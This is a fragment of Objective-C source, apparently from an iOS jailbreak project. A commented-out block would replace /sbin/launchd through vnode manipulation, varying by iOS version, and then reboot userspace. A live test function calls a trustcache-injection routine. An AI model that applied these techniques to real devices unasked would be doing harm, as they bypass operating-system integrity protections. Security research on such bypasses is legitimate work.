    //SwitchSysBin("/sbin/launchd", originallaunchd, &orig_to_vnode, &orig_nc_vp);
    
    if (SYSTEM_VERSION_LOWER_THAN(@"16.4")) 
    {
        uint64_t orig_nc_vp, orig_to_vnode = 0;
        SwitchSysBin("/sbin/launchd", originallaunchd, &orig_to_vnode, &orig_nc_vp);
    } else if(SYSTEM_VERSION_EQUAL_TO(@"16.6")) 
    {
        uint64_t orig_nc_vp, orig_to_vnode = 0;
        SwitchSysBin("/sbin/launchd", originallaunchd, &orig_to_vnode, &orig_nc_vp);
    } else 
    {
        SwitchSysBinOld(GetVnodeAtPathByChdir("/sbin"), "launchd", originallaunchd);
    }
    
    userspaceReboot();
     */
    return 0;
}
UInt64 testKalloc(void) {
    return 0x1; //version counter for sora, makes sure I actually updated
}
UInt64 testTC(void) {
    tcinjecttest();
    return 0;
}
